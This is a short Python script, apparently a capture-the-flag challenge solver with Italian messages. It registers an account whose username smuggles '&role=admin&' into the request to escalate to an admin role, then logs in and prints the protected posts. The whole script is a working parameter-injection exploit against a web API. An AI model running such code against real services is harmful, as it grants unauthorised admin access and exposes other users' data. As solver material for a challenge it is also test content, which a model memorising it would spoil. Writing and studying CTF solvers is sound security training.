#!/usr/bin/env python3
import requests
import base64
import sys
import argparse
import random
import string

random_string = lambda x: ''.join(random.choices(string.ascii_letters + string.digits, k = x))

def solve(host, port):
    URL = f"http://{host}:{port}"
    print(f"Testing {URL}...")
    try:
        username = f"{random_string(10)}&role=admin&"
        password = random_string(10)

        s = requests.Session()

        r = s.post(f"{URL}/api/register", json = {
            "username": username,
            "password": password
        })

        assert r.status_code == 201

        r = s.post(f"{URL}/api/login", json = {
            "username": username,
            "password": password
        })

        response = s.get(f"{URL}/api/posts", timeout=10)
        
        if response.status_code != 200:
            print(f"Errore: Status code non 200 (ricevuto {response.status_code})")
            return 1 
        
        print(response.text)
        return 0

    except requests.exceptions.RequestException as e:
        print(f"Errore di connessione: {e}")
        return 1

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser()
    parser.add_argument('--hostname', type=str, required=True, help='Hostname o IP della challenge')
    parser.add_argument('--port', type=int, required=True, help='Porta della challenge')
    
    args = parser.parse_args()
    sys.exit(solve(args.hostname, args.port))